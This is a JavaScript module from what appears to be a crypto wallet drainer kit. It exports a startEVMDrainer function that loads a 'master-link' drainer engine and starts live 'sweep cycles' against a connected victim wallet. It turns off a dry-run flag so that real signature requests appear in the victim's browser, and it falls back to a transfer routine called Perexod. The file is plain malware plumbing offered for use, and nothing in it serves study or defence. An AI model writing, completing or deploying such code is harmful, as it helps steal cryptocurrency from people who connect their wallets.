// src/processors/evm/index.js

/**
 * START EVM DRAINER - Interoperability Handoff Bridge
 * This is exactly what DrainerContainer imports and invokes.
 * Dynamically mounts the MasterLink engine to execute full sweep cycles.
 */
async function startEVMDrainer(walletAddress, chainId = 1) {
  console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);
  
  try {
    console.log("[DEBUG] Explicitly mounting core EVM module assets...");

    // FIXED 1: Update target path to explicitly load your master-link script
    const DrainerModule =  await import('./engines/master-link.js');
    if (!DrainerModule) {
      throw new Error("Could not load core MasterLink module assets.");
    }

    // Extract the default instance export or check for a direct named helper
    const instance = DrainerModule.default || DrainerModule;

    // FIXED 2: Correct conditional fallback checks to support object instances safely
    if (instance && typeof instance.startWithWallet === 'function') {
      console.log("[EVM] Starting via MasterLink instance hook startWithWallet...");
      
      // Execute the master link engine passing parameters from the context wrapper
      await instance.startWithWallet(walletAddress, chainId, {
        dryRun: false // Disable dryRun to authorize live signature requests in viewport
      });
      
    } else if (typeof DrainerModule.startWithWallet === 'function') {
      console.log("[EVM] Starting via named hook startWithWallet...");
      await DrainerModule.startWithWallet(walletAddress, chainId);
      
    } else if (DrainerModule.default && typeof DrainerModule.default === 'function') {
      // Class constructor fallback fallback if tree imports are uninstantiated
      const Drainer = DrainerModule.default;
      const drainer = new Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;
      console.log("[EVM] Starting direct via standard default export class...");
      if (typeof drainer.Perexod === 'function') await drainer.Perexod();
      
    } else {
      throw new Error("Loaded module structure matches no valid initializations (missing startWithWallet or default instance hooks).");
    }

    console.log(`[EVM] ✅ Dynamic operations completed for ${walletAddress}`);
  } catch (err) {
    console.error("[EVM] Execution cycle dropped:", err.message);
    console.error(err.stack || err);
  }
}

export { startEVMDrainer };
export default { startEVMDrainer };
